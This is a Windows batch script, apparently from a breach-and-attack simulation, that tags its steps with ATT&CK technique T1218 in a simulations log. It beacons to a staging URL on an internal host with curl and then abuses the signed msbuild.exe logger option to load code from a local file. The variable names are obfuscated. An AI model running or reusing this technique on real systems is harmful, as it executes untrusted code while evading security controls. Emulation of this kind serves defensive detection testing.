@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET ojre=%APPDATA%\9746\d0d95359
SET rewer=https://10.0.0.49
SET vcfdr=https://10.0.0.49/stage/2/icon.png?9746-7
SET knfd=ITZEL-S2B
SET jhqg=7
SET wclm=control.txt
SET zvwcvx=9746
SET tsvar=!DATE!/!TIME!

SET logfile=%APPDATA%\!jhqg!\macula-simulations.log
echo [!tsvar!][DEBUG][!knfd!][!zvwcvx!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!vcfdr!"
echo [!tsvar!][DEBUG][!knfd!][!zvwcvx!]: heartbeat_complete>> "!logfile!" 2>nul

cd /d "!ojre!" >nul 2>&1
echo [!tsvar!][DEBUG][!knfd!][!zvwcvx!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

SET eres=1
SET edet=

echo [!tsvar!][DEBUG][!knfd!][!zvwcvx!]: msbuild_start>> "!logfile!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe /logger:LoggerEntry,"!wclm!";MyParameters,Foo >NUL 2>&1
IF !errorlevel! NEQ 0 SET eres=0&SET edet=exec_failed
echo [!tsvar!][TTP][!knfd!][!zvwcvx!]: T1218|Signed Binary Proxy Execution=!eres!:!edet!>> "!logfile!" 2>nul
ENDLOCAL